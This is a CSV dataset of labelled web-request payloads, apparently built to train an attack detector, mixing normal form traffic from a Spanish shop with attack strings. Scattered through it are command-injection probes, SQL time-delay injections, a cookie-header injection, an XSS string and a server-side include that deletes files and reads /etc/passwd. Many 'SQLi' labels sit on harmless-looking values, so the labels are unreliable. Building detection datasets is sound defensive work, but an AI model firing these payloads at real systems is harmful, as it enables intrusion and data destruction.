payload,label,source
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20SZMRAM%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%207%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%5C%5C,CMD,seclists_cmd
9BC8249F1897E32DF99ED492B6F89B93,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=3&nombre=Vino+Rioja&precio=100&cantidad=94&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_test.txt
2680573956820155,Normal,csic_gsi:cisc_normalTraffic_train.txt
12123,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
BF6ECD6769B79BB7C3572C67D5D1A5B4,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
38E63E23F92AF8547E11C41FB5831F20,Normal,csic_gsi:cisc_normalTraffic_train.txt
41820,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
pistola,Normal,csic_gsi:cisc_normalTraffic_test.txt
nafsika,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3A69FBF13E36A0E6BADF20116ECF8B2B,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2522%7C%20%5B%203%20-ne%20%24%28echo%20BILMTI%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%252F%252F,CMD,seclists_cmd
26AF59A2BBF23A07867BFA1CA4CC2A9B,Normal,csic_gsi:cisc_normalTraffic_train.txt
694C2671F0B0BF3785ECD6D9696869C3,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
corconera,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8EC63F0C182229BC18747A018E446547,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=insertar&precio=4060&B1=Confirmar,Normal,csic_gsi:cisc_normalTraffic_test.txt
0D7DC73D14806F990E45354797C3E781,Normal,csic_gsi:cisc_normalTraffic_test.txt
kathy,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
echo$IFSKNEEFY$((64%2B22))$(echo$IFSKNEEFY)KNEEFY%5C%5C,CMD,seclists_cmd
F40C5CFF6D27A15D9A4C7E20788D3F74,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2527%0A%20str%3D%24%28echo%20KQSZPY%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%23,CMD,seclists_cmd
4E7707CE62616D305C8FF3B0D8A76184,Normal,csic_gsi:cisc_normalTraffic_train.txt
Nanda,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Santa+Cruz+de+Tenerife,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=3&nombre=Queso+Manchego&precio=100&cantidad=55&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_train.txt
06C93F6A0CE9B862F055743C3BF9F8BF,Normal,csic_gsi:cisc_normalTraffic_train.txt
de_souza,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20%5B%207%20-ne%20%24%28echo%20DAJIYU%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,CMD,seclists_cmd
mcharg,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
23CA2B946DEFCE04BC8B2965D02DD56E,Normal,csic_gsi:cisc_normalTraffic_test.txt
lemar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
53D71977725CDC74264B948AFC29585D,Normal,csic_gsi:cisc_normalTraffic_test.txt
BA3E51A0543C72D224979713AF98BC5E,Normal,csic_gsi:cisc_normalTraffic_test.txt
afelPar,Normal,csic_gsi:cisc_normalTraffic_train.txt
lowry-carmine@filtraciondehumos.nc,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%20echo%20DWODRY$((85%2B90))$(echo%20DWODRY)DWODRY%22,CMD,seclists_cmd
CD8601FB8AAFB52DE97A86032386E7E9,Normal,csic_gsi:cisc_normalTraffic_train.txt
2533A5DC92DC5FE5E7822C49F9597F42,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D11E1774682721DB438DF85FA149DD7A,Normal,csic_gsi:cisc_normalTraffic_train.txt
'%7Cecho$IFSGRFQBP$((21%2B44))$(echo$IFSGRFQBP)GRFQBP%22,CMD,seclists_cmd
Mulet+Lichtle,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=defalco&password=botones&nombre=Suyai&apellidos=R�bago+Patraca&email=bonos8@puravidasa.d@o&dni=24778234N&direccion=C/+La+Salpa+104,+&ciudad=Moral+de+la+Reina&cp=10334&provincia=Burgos&ntc=5823821605242067&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
9770CDF1328435AEE652D376520383E5,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%3B%20str%3D%24%28echo%20GUASVW%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%23,CMD,seclists_cmd
modoA=insertar&precio=4708&B1=Pasar+por+caja,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
17B86074A959ED5B03515068E1982F50,Normal,csic_gsi:cisc_normalTraffic_train.txt
75CD32D3920E5FEA96F8CA6A1663C3E7,Normal,csic_gsi:cisc_normalTraffic_train.txt
25382,Normal,csic_gsi:cisc_normalTraffic_test.txt
&echo%20QSELIT$((42%2B46))$(echo%20QSELIT)QSELIT&,CMD,seclists_cmd
3E333080E786FBC835DC429176FEFE70,Normal,csic_gsi:cisc_normalTraffic_train.txt
id=3Set-cookie%3A+Tamper%3D1041264011025374727&nombre=Queso+Manchego&precio=100&cantidad=0&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
""");}print(`echo%20YSGCAB%0aecho%20$((76%2B3))%0aecho%20YSGCAB%0aecho%20YSGCAB`)%3B%252523YSGCAB",CMD,seclists_cmd
"modo=registro&login=waldo2&password=graciola&nombre=Notburga&apellidos=Argando�a+Cobo&email=clarence@multasdetransito.sh&dni=33075163J&direccion=Calle+San+Felix+De+Alcala,+188,+4G&ciudad=San+Felices&cp=19341&provincia=Almer�a&ntc=2215479949599833&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
C58F3538DA3C6ED71329E2110E5C9961,Normal,csic_gsi:cisc_normalTraffic_test.txt
%27%0A%20str%3D%24%28echo%20FXCZOR%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526,CMD,seclists_cmd
${proc_open(print(`echo%20BUFRZN`.`echo%20$((99%2B37))`.`echo%20BUFRZN`.`echo%20BUFRZN`)%3B%5C%5CBUFRZN,CMD,seclists_cmd
C7731DDD07F46C9C3A54C22EA98E9E3D,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Calle+Melchor+Cobo+Medina,+16,+6H",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
C/+Vulcano+29+,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
33746,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20QUSUIJ%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20,CMD,seclists_cmd
%3B%20str%3D%24%28echo%20YBRDJI%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%5C%5C,CMD,seclists_cmd
%27%0A%20str%3D%24%28echo%20TNNFNL%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C,CMD,seclists_cmd
gulager-balsan6@978.dm,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
;echo$IFSRHWTNA$((89%2B71))$(echo$IFSRHWTNA)RHWTNA,CMD,seclists_cmd
modo=entrar&login=lue39&pwd=infiltraci�n&remember=off&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=insertar&precio=3318&B1=Pasar+por+caja,Normal,csic_gsi:cisc_normalTraffic_test.txt
241A77CC890F87E94040BB2E8698B35A,Normal,csic_gsi:cisc_normalTraffic_train.txt
28B86401077E9509B9851D1CA812B78A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=1&nombre=Jam�n+Ib�rico&precio=85&cantidad=75&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20FDEYNL%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%257C,CMD,seclists_cmd
4B2FDF85693BA74430ACDAD5623C186A,Normal,csic_gsi:cisc_normalTraffic_test.txt
F3C04C9BCFD368ABAC02C0789DABCA2A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
E518150CB3B127EBA949C9D9ED95FAA4,Normal,csic_gsi:cisc_normalTraffic_train.txt
0DCF9FC64B16680BA534CEAD563DE01E,Normal,csic_gsi:cisc_normalTraffic_test.txt
1FA922303ABBDA739E8272092F8BE6B2,Normal,csic_gsi:cisc_normalTraffic_train.txt
08FD38323A3F7B5F816483D5E0A25384,Normal,csic_gsi:cisc_normalTraffic_test.txt
5385221617963613,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=cilka&password=B17VeZA&nombre=Atuel&apellidos=Ortega+Ferrara&email=oaker@drogasvirtuales.ma&dni=82234246T&direccion=Calle+Arcos,+S/N,+&ciudad=Aledo&cp=12469&provincia=Huelva&ntc=9442191219823547&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
2E6BF4F5EAD893D78E86A06BD981E08A,Normal,csic_gsi:cisc_normalTraffic_train.txt
12A6919EA6A691BEF0D1E1BA6130C6AC,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
950B30396ACE6F014D3745165AFCF676,Normal,csic_gsi:cisc_normalTraffic_train.txt
4CE19E17ED371832004EE295195C45D8,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"C/+Campogris+117,+",Normal,csic_gsi:cisc_normalTraffic_test.txt
${popen(print(`echo%20FRWTRM;echo%20$((11%2B41));echo%20FRWTRM;echo%20FRWTRM`)%3B.%2522FRWTRM,CMD,seclists_cmd
9067FB7D8D21A287B3B819E0524EF8E8,Normal,csic_gsi:cisc_normalTraffic_test.txt
DC24D3DAD132BEDF9E95867B2E9916C5,Normal,csic_gsi:cisc_normalTraffic_train.txt
59AFA5FC1DDE0745291C782684EF4CAF,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Calle+Nueva+De+Arriba,+111+9G",Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%3Becho%20BPGUEU$((77%2B5))$(echo%20BPGUEU)BPGUEU%22,CMD,seclists_cmd
%27||echo%20RTVDXH$((26%2B45))$(echo%20RTVDXH)RTVDXH//,CMD,seclists_cmd
%0A%20str%3D%24%28echo%20DPBAVN%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27,CMD,seclists_cmd
8E307BAC2FE5B1A7D30F67429CEBC814,Normal,csic_gsi:cisc_normalTraffic_train.txt
Boneton+Casares,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
00CFCFABE185D4FEDF8413BDE2C40FB7,Normal,csic_gsi:cisc_normalTraffic_train.txt
D9C59A559B425701FD5DC50046D2BF82,Normal,csic_gsi:cisc_normalTraffic_train.txt
6F3068A05A1C878E9A41B202B61A64B2,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
F56D2090E9EB0C8E530A36A78D365164,Normal,csic_gsi:cisc_normalTraffic_train.txt
B3D265D0C1DA7B7DBB6BB27F56BD5C78,Normal,csic_gsi:cisc_normalTraffic_train.txt
0099C0324860DEBA61B7E6E7CFFC4D1B,Normal,csic_gsi:cisc_normalTraffic_train.txt
%27;echo$IFSXUIGJZ$((84%2B80))$(echo$IFSXUIGJZ)XUIGJZ%22,CMD,seclists_cmd
12C4E619C61DEAB5BCB1A961CA76B0FE,Normal,csic_gsi:cisc_normalTraffic_train.txt
847E503563B036AEFF9D21A15528D887,Normal,csic_gsi:cisc_normalTraffic_test.txt
2ECC127565C307C91296B74714EFAC1A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
46175,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Llanes,Normal,csic_gsi:cisc_normalTraffic_train.txt
janaver@decobiombo.cz,Normal,csic_gsi:cisc_normalTraffic_test.txt
pelir0o89,Normal,csic_gsi:cisc_normalTraffic_test.txt
54EDF54FFF9E73C2E658A289158687EB,Normal,csic_gsi:cisc_normalTraffic_train.txt
3A1EF021A251CFEEC1A59D058D0FF03E,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2527%26%20sleep%200%20%26%26%20str%3D%24%28echo%20PRKGES%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%207%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2526,CMD,seclists_cmd
%22%3B%20str%3D%24%28echo%20UDCJAJ%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%5C%5C,CMD,seclists_cmd
E125B5ACF7A692AB9F09BC732733C144,Normal,csic_gsi:cisc_normalTraffic_train.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20NAHLJW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%204%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2522,CMD,seclists_cmd
2BC1F3A6D8674CE51615101DD13CACD9,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Oca�a+Alcover,Normal,csic_gsi:cisc_normalTraffic_train.txt
B413BA213691C45EB3008697A2CE93F7,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
B10F700C4645956F54716B2A18F227A4,Normal,csic_gsi:cisc_normalTraffic_test.txt
4C98544ACD8C1C84DC67FB20AC230E5D,Normal,csic_gsi:cisc_normalTraffic_test.txt
Puyal+Catalan,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
CE7DCB10D04DB3AD2C41EF4B39E06D5A,Normal,csic_gsi:cisc_normalTraffic_test.txt
33F37B8A84AB2E612D72673C01965916,Normal,csic_gsi:cisc_normalTraffic_test.txt
Guizasola+Curiel,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
DB3E935CFB1D7D1C251D12FD783BA15B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
7B318D034256D463709854518FED18F4,Normal,csic_gsi:cisc_normalTraffic_train.txt
&&echo%20JLZBTB$((60%2B18))$(echo%20JLZBTB)JLZBTB\,CMD,seclists_cmd
Arbo,Normal,csic_gsi:cisc_normalTraffic_test.txt
1C139096A226BB380EE359AC6C2E343C,Normal,csic_gsi:cisc_normalTraffic_train.txt
D04E9ED945F3B2AAEBEE1BF3A10B501F,Normal,csic_gsi:cisc_normalTraffic_train.txt
F3CC5640087C1DA8F112BE09309CD9AE,Normal,csic_gsi:cisc_normalTraffic_test.txt
echo$IFSVVUMIP$((18%2B35))$(echo$IFSVVUMIP)VVUMIP%26,CMD,seclists_cmd
EquIN57erMo,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
E9B303AD2E4DFB663B70CA56A822A49A,Normal,csic_gsi:cisc_normalTraffic_test.txt
Dimicio,Normal,csic_gsi:cisc_normalTraffic_test.txt
Larra+Lebriquir,Normal,csic_gsi:cisc_normalTraffic_test.txt
81878772Z,Normal,csic_gsi:cisc_normalTraffic_train.txt
AD7F402D523A855D331E5C62D801D4D5,Normal,csic_gsi:cisc_normalTraffic_test.txt
0B451C6538AEF9A7BC9A4DD485678081,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Bruma,+172+4?B",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Nal�n,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
673CFB331884BD33CB8E59C68738D2F6,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26%26echo%20PUUCTR$((68%2B33))$(echo%20PUUCTR)PUUCTR%2F%2F,CMD,seclists_cmd
"modo=registro&login=arro&password=ve8do71&nombre=Brunno&apellidos=Xandri&email=linde-gridoux@saludyfitness.er&dni=13103692V&direccion=Padre+Rego,+71+2?H&ciudad=Carrascal+del+Obispo&cp=45521&provincia=Zaragoza&ntc=8941990711802525&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
DA5F7A4EAF5EE37DB93DA00AA27EC74B,Normal,csic_gsi:cisc_normalTraffic_train.txt
id=3&nombre=');waitfor+delay+'0:0:15';--&precio=39&cantidad=4&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
A�adir+al+carritoany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
E5CF12E369213F71D0CBB5C41BCFB065,Normal,csic_gsi:cisc_normalTraffic_train.txt
810EFE36CD8928D94BBF0FE19256C208,Normal,csic_gsi:cisc_normalTraffic_train.txt
F594F7803F91FE4EE88F9B9793DD5F69,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=koolstra&password=oRdenaNte&nombre=Ivo&apellidos=Herrero+Barberis&email=briers.lester@decsl.pt&dni=56149521N&direccion=Av.+Valdecilla,+86+&ciudad=Cheste&cp=1247A&provincia=Tarragona&ntc=0452979446378052&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
clausen@estaestuweb.com.web,Normal,csic_gsi:cisc_normalTraffic_test.txt
34D95C3E4C0417A493194FA006C90FE8,Normal,csic_gsi:cisc_normalTraffic_train.txt
id=3&nombre=Vino+Rioja&precio=85&cantidad=68&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_test.txt
1A3679792CF7F227BB63953EAB914FB1,Normal,csic_gsi:cisc_normalTraffic_train.txt
Compieque,Normal,csic_gsi:cisc_normalTraffic_test.txt
Pajaroncillo,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
FA1C05A44C0B039E1FDC90B19F48BE4A,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Avinguda+Puigfred+108,+",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
serrault8@elcorteitaliano.lr,Normal,csic_gsi:cisc_normalTraffic_test.txt
962657DBE8EFD2287C51114A1F0FCDF9,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%7C%20%5B%209%20-ne%20%24%28echo%20FATRPK%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%22,CMD,seclists_cmd
80u5rru9ca0,Normal,csic_gsi:cisc_normalTraffic_test.txt
DCA5A2956DAC1C36C35462281437BE1B,Normal,csic_gsi:cisc_normalTraffic_train.txt
E99DD2B0DE183A61925AEA28A20B6FA6,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
41944516Z,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
EEC21F863FBF5EC1BEF4BAC8C27CDD74,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
2B77DBCEDF262B80CDA164C46CA2393C,Normal,csic_gsi:cisc_normalTraffic_test.txt
Sem,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
90E81C2C18204E8BC5E5FD6ACD58324B,Normal,csic_gsi:cisc_normalTraffic_test.txt
3D069EE8BB29957310FE260A12E1DB05,Normal,csic_gsi:cisc_normalTraffic_train.txt
1C78EAEEA081580E37E74BC5D5A41321,Normal,csic_gsi:cisc_normalTraffic_train.txt
chevy,Normal,csic_gsi:cisc_normalTraffic_test.txt
C95D2E0D8DC0F099CCAA14F7004E26FD,Normal,csic_gsi:cisc_normalTraffic_test.txt
87499C99DC02E587D44B52DA7DC9C8F8,Normal,csic_gsi:cisc_normalTraffic_train.txt
019E2A7E09AB67BA81C504EE98586825,Normal,csic_gsi:cisc_normalTraffic_train.txt
4761547357229973,Normal,csic_gsi:cisc_normalTraffic_train.txt
&echo%20YSZWVH$((93%2B51))$(echo%20YSZWVH)YSZWVH,CMD,seclists_cmd
ED2CB789583F3F5CB2443D851C44FC16,Normal,csic_gsi:cisc_normalTraffic_test.txt
F148E4081277F2FB58153C34EFD22929,Normal,csic_gsi:cisc_normalTraffic_test.txt
"&&echo$IFSHHBLVW$((31%2B45))$(echo$IFSHHBLVW)HHBLVW""",CMD,seclists_cmd
03770,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
481AA8D5702A27E5F30B13D86A068612,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
lieure,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
66FC44AF3619398175072D919B4C8692,Normal,csic_gsi:cisc_normalTraffic_test.txt
2C4E32ADA384AA217B6BF2E2A3C78FD0,Normal,csic_gsi:cisc_normalTraffic_test.txt
7ED1182552F220C839360E904FDB579B,Normal,csic_gsi:cisc_normalTraffic_test.txt
"B2=<!--#exec+cmd=""rm+-rf+/;cat+/etc/passwd""+-->",PathTraversal,csic_gsi:cisc_anomalousTraffic_test.txt
aborrecimiento,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
30730,Normal,csic_gsi:cisc_normalTraffic_test.txt
AFBBC61DDB37D34E266A21BEF39B7A94,Normal,csic_gsi:cisc_normalTraffic_train.txt
"','0','0');waitfor+delay+'0:0:15';--",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Bonas+Crehuet,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=entrar&login=heinonen&pwd=','0','0');waitfor+delay+'0:0:15';--&remember=on&B1=Entrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
580CFFBB95383FC4F64A0AE2A90A3982,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
A2CE9C8B0230C1953C2EB9BFDE0F0C9A,Normal,csic_gsi:cisc_normalTraffic_train.txt
sedran,Normal,csic_gsi:cisc_normalTraffic_train.txt
"C/+Geranio,+65+",Normal,csic_gsi:cisc_normalTraffic_train.txt
Aliberta,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
7201,Normal,csic_gsi:cisc_normalTraffic_train.txt
0D75E7ED5CE6E0C3E7FBC3D2579C5104,Normal,csic_gsi:cisc_normalTraffic_train.txt
${passthru(print(`echo%20QKCAAG%0aecho%20$((61%2B22))%0aecho%20QKCAAG%0aecho%20QKCAAG`)%3B.%252527QKCAAG,CMD,seclists_cmd
D8C2FE97B7FA2D978AD8DBA245995769,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2522%3B%20str%3D%24%28echo%20KGCQCV%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20,CMD,seclists_cmd
ladron�a,Normal,csic_gsi:cisc_normalTraffic_test.txt
5525651112405AE4C62467C641988788,Normal,csic_gsi:cisc_normalTraffic_train.txt
Usagre,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=entrar&login=viviana&pwd=sinAleFA&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
+faccioso,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=nabeil4&password=desnuda&nombre=Xanto&apellidos=Palau+Tanquia&email=molnar@g-audi.pro&dni=05636576N&direccion=Pl.+Santa+Isabel+S/N,+8-D&ciudad=Villagalijo&cp=50562&provincia=Zamora&ntc=2026124219956883&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
802320377A71BC07678A95058663EDA5,Normal,csic_gsi:cisc_normalTraffic_test.txt
20AF204FCC7078977CA9B32A66266626,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
39672063F,Normal,csic_gsi:cisc_normalTraffic_train.txt
""";echo$IFSZRNVWQ$((61%2B2))$(echo$IFSZRNVWQ)ZRNVWQ%22",CMD,seclists_cmd
Padre+Lojendio+53+11?C,Normal,csic_gsi:cisc_normalTraffic_train.txt
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",XSS,community:payloads_seed
B5CDF14A9A7D453D3DA1958E6CA30296,Normal,csic_gsi:cisc_normalTraffic_test.txt
2018DFA1B8DC5650432D3DDFFE740D85,Normal,csic_gsi:cisc_normalTraffic_train.txt
50878251C,Normal,csic_gsi:cisc_normalTraffic_test.txt
"i,nt32n/1773n'02a",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
4106DA6D32C982C6A5177DB2028154B0,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
E6EE1C6017D07E8D1CDC83B663A82C86,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2527%7C%20%5B%205%20-ne%20%24%28echo%20IQYBMK%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,CMD,seclists_cmd
"pulverizador""><!--#EXEC+cmd=""dir+""--><",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
6005A8A06AC0F511A228EE15BE856C4B,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2522%0A%20str%3D%24%28echo%20SFURKW%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526,CMD,seclists_cmd
1EA7F25801DE37506C76E031ED6DAEDD,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Morella,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
14130,Normal,csic_gsi:cisc_normalTraffic_test.txt
B3B082669C5360CD186B1FB5015A4126,Normal,csic_gsi:cisc_normalTraffic_train.txt
DAF3649E89EDDF4E101B18A7B2FC0B29,Normal,csic_gsi:cisc_normalTraffic_train.txt
8A2F97992528D9B8E98E54EC5BD40423,Normal,csic_gsi:cisc_normalTraffic_test.txt
151ED6ED39FF4FB571AB0B56B2423197,Normal,csic_gsi:cisc_normalTraffic_train.txt
EF42B851118B9D1E01925B26AD250DCE,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3111B4EC72F8F9D0856D828292EC9E13,Normal,csic_gsi:cisc_normalTraffic_test.txt
9E6CEA82B799BCFB6784A29B1F9BE613,Normal,csic_gsi:cisc_normalTraffic_train.txt
7162914208436740,Normal,csic_gsi:cisc_normalTraffic_test.txt
08310,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
74B21B0A1EFCC513B952ABC1E62B55D6,Normal,csic_gsi:cisc_normalTraffic_train.txt
||echo%20TVGLAW$((25%2B16))$(echo%20TVGLAW)TVGLAW%7C,CMD,seclists_cmd
9FFE5F1C530F7C163560EE78566464C0,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
188D741BBCE49496FEBC82C72D08A174,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
37258,Normal,csic_gsi:cisc_normalTraffic_train.txt
